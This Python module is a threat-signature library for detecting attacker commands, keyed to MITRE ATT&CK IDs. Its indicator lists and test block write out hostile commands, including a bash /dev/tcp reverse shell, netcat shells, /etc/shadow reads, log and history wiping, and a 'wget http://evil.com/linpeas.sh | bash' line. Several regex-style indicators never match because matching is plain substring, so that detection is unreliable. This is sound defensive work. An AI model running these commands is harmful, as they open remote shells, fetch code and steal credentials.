"""
Threat Library
Database of known attack patterns, tools, and signatures
"""
import json
import logging
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class ThreatSignature:
    """Signature of a known threat"""
    id: str
    name: str
    category: str
    severity: str
    description: str
    indicators: List[str]
    mitre_attack_id: Optional[str] = None
    references: Optional[List[str]] = None
    
    def __post_init__(self):
        if self.references is None:
            self.references = []


class ThreatLibrary:
    """
    Repository of known attack signatures and patterns
    Provides matching and lookup capabilities
    """
    
    def __init__(self):
        self.signatures: Dict[str, ThreatSignature] = {}
        self._load_default_signatures()
        
    def _load_default_signatures(self):
        """Load default threat signatures"""
        
        default_signatures = [
            ThreatSignature(
                id="reverse_shell_bash",
                name="Bash Reverse Shell",
                category="execution",
                severity="critical",
                description="Common bash reverse shell pattern",
                indicators=[
                    "bash -i >& /dev/tcp/",
                    "bash -c 'bash -i >& /dev/tcp/",
                    "sh -i >& /dev/tcp/"
                ],
                mitre_attack_id="T1059.004"
            ),
            ThreatSignature(
                id="reverse_shell_netcat",
                name="Netcat Reverse Shell",
                category="execution",
                severity="critical",
                description="Netcat-based reverse shell",
                indicators=[
                    "nc -e /bin/bash",
                    "nc -e /bin/sh",
                    "netcat -e /bin/bash"
                ],
                mitre_attack_id="T1059.004"
            ),
            ThreatSignature(
                id="python_reverse_shell",
                name="Python Reverse Shell",
                category="execution",
                severity="critical",
                description="Python-based reverse shell",
                indicators=[
                    "python -c 'import socket",
                    "python3 -c 'import socket",
                    "__import__('socket')"
                ],
                mitre_attack_id="T1059.006"
            ),
            ThreatSignature(
                id="suid_enumeration",
                name="SUID Binary Enumeration",
                category="privilege_escalation",
                severity="high",
                description="Search for SUID binaries for privilege escalation",
                indicators=[
                    "find / -perm -4000",
                    "find / -perm -u=s",
                    "find / -user root -perm -4000"
                ],
                mitre_attack_id="T1548.001"
            ),
            ThreatSignature(
                id="passwd_shadow_dump",
                name="Password File Dumping",
                category="credential_access",
                severity="high",
                description="Attempting to read password files",
                indicators=[
                    "cat /etc/shadow",
                    "cat /etc/passwd",
                    "grep -v '^#' /etc/shadow"
                ],
                mitre_attack_id="T1003.008"
            ),
            ThreatSignature(
                id="ssh_key_persistence",
                name="SSH Key Persistence",
                category="persistence",
                severity="high",
                description="Installing SSH keys for persistence",
                indicators=[
                    "echo.*>> ~/.ssh/authorized_keys",
                    "echo.*> ~/.ssh/authorized_keys",
                    "cat.*>> ~/.ssh/authorized_keys"
                ],
                mitre_attack_id="T1098.004"
            ),
            ThreatSignature(
                id="cron_persistence",
                name="Cron Job Persistence",
                category="persistence",
                severity="high",
                description="Creating cron jobs for persistence",
                indicators=[
                    "crontab -e",
                    "echo.*> /etc/cron",
                    "echo.*> /var/spool/cron"
                ],
                mitre_attack_id="T1053.003"
            ),
            ThreatSignature(
                id="history_clearing",
                name="Command History Clearing",
                category="defense_evasion",
                severity="medium",
                description="Clearing command history to hide tracks",
                indicators=[
                    "history -c",
                    "rm ~/.bash_history",
                    "unset HISTFILE",
                    "export HISTFILESIZE=0"
                ],
                mitre_attack_id="T1070.003"
            ),
            ThreatSignature(
                id="log_tampering",
                name="Log File Tampering",
                category="defense_evasion",
                severity="high",
                description="Modifying or deleting log files",
                indicators=[
                    "rm /var/log/",
                    "echo '' > /var/log/",
                    "truncate -s 0 /var/log/"
                ],
                mitre_attack_id="T1070.002"
            ),
            ThreatSignature(
                id="webshell_upload",
                name="Web Shell Upload Pattern",
                category="persistence",
                severity="critical",
                description="Patterns indicating web shell upload",
                indicators=[
                    "echo.*<?php.*> /var/www",
                    "echo.*<?php.*> /usr/share/nginx",
                    "wget.*shell.php"
                ],
                mitre_attack_id="T1505.003"
            ),
            ThreatSignature(
                id="credential_harvesting",
                name="Credential Harvesting",
                category="credential_access",
                severity="high",
                description="Searching for credentials in files",
                indicators=[
                    "grep -r password",
                    "find / -name '*password*'",
                    "grep -r 'api_key'",
                    "grep -r 'secret'"
                ],
                mitre_attack_id="T1552.001"
            ),
            ThreatSignature(
                id="linpeas_enum",
                name="LinPEAS Enumeration Tool",
                category="reconnaissance",
                severity="high",
                description="Linux privilege escalation enumeration script",
                indicators=[
                    "linpeas.sh",
                    "curl.*linpeas",
                    "wget.*linpeas"
                ],
                mitre_attack_id="T1592"
            ),
        ]
        
        for sig in default_signatures:
            self.add_signature(sig)
            
    def add_signature(self, signature: ThreatSignature):
        """Add a threat signature to the library"""
        self.signatures[signature.id] = signature
        logger.debug(f"[ThreatLibrary] Added signature: {signature.name}")
        
    def remove_signature(self, signature_id: str) -> bool:
        """Remove a signature from the library"""
        if signature_id in self.signatures:
            del self.signatures[signature_id]
            logger.info(f"[ThreatLibrary] Removed signature: {signature_id}")
            return True
        return False
        
    def get_signature(self, signature_id: str) -> Optional[ThreatSignature]:
        """Get a specific signature"""
        return self.signatures.get(signature_id)
        
    def match(self, text: str) -> List[ThreatSignature]:
        """
        Match text against all signatures
        
        Args:
            text: Text to match against (e.g., command, file content)
            
        Returns:
            List of matching signatures
        """
        matches = []
        text_lower = text.lower()
        
        for signature in self.signatures.values():
            for indicator in signature.indicators:
                if indicator.lower() in text_lower:
                    matches.append(signature)
                    break  # Only add signature once
                    
        if matches:
            logger.info(f"[ThreatLibrary] Matched {len(matches)} signatures for: {text[:50]}...")
            
        return matches
        
    def search_by_category(self, category: str) -> List[ThreatSignature]:
        """Get all signatures in a category"""
        return [sig for sig in self.signatures.values() if sig.category == category]
        
    def search_by_severity(self, severity: str) -> List[ThreatSignature]:
        """Get all signatures with specific severity"""
        return [sig for sig in self.signatures.values() if sig.severity == severity]
        
    def get_categories(self) -> List[str]:
        """Get all unique categories"""
        return list(set(sig.category for sig in self.signatures.values()))
        
    def get_statistics(self) -> Dict[str, Any]:
        """Get library statistics"""
        categories = {}
        severities = {}
        
        for sig in self.signatures.values():
            categories[sig.category] = categories.get(sig.category, 0) + 1
            severities[sig.severity] = severities.get(sig.severity, 0) + 1
            
        return {
            "total_signatures": len(self.signatures),
            "by_category": categories,
            "by_severity": severities
        }
        
    def export_json(self) -> str:
        """Export library to JSON"""
        data = {
            "signatures": [asdict(sig) for sig in self.signatures.values()]
        }
        return json.dumps(data, indent=2)
        
    def import_json(self, json_str: str):
        """Import signatures from JSON"""
        data = json.loads(json_str)
        for sig_data in data.get("signatures", []):
            sig = ThreatSignature(**sig_data)
            self.add_signature(sig)


# Example usage
if __name__ == "__main__":
    library = ThreatLibrary()
    
    print("=" * 80)
    print("THREAT LIBRARY STATISTICS")
    print("=" * 80)
    stats = library.get_statistics()
    print(json.dumps(stats, indent=2))
    
    print("\n" + "=" * 80)
    print("TESTING SIGNATURE MATCHING")
    print("=" * 80)
    
    test_commands = [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "find / -perm -4000 2>/dev/null",
        "cat /etc/shadow",
        "history -c && rm ~/.bash_history",
        "wget http://evil.com/linpeas.sh | bash",
        "ls -la",  # Benign command
    ]
    
    for cmd in test_commands:
        matches = library.match(cmd)
        print(f"\nCommand: {cmd}")
        if matches:
            print(f"Matches: {len(matches)}")
            for match in matches:
                print(f"  - {match.name} ({match.severity}) - {match.description}")
        else:
            print("  No matches (benign)")
